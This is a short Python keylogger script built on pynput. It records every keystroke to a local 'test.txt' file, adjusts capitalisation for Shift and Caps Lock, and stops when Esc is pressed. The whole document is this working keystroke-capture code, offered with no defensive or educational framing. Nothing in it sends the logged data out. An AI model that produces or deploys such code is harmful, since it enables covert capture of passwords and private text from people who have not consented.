# Libraries
from pynput import keyboard


# The key triggers when pressed and writes to the “test.txt” file
def on_press(key):
    global count_ctrl, count_shift

    try:
        key = key.char
    except:
        key = str(key).split(".")[1].upper()
        key = f"[{key}]"

    # File entry
    with open("test.txt", "a", encoding="UTF-8") as file:
        if key == "[ENTER]":
            file.write(key)
            file.write("\n")
        elif key == "[CAPS_LOCK]":
            count_ctrl += 1
        elif key == "[SHIFT]":
            count_shift = True
        else:
            if count_ctrl % 2 == 0 or count_shift:
                file.write(key.upper())
            else:
                file.write(key)


# Triggers when the key is pressed 
def on_release(key):
    global count_shift
    if key == keyboard.Key.esc:
        return False
    
    if key == keyboard.Key.shift:
        count_shift = False

count_ctrl = 1
count_shift = False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()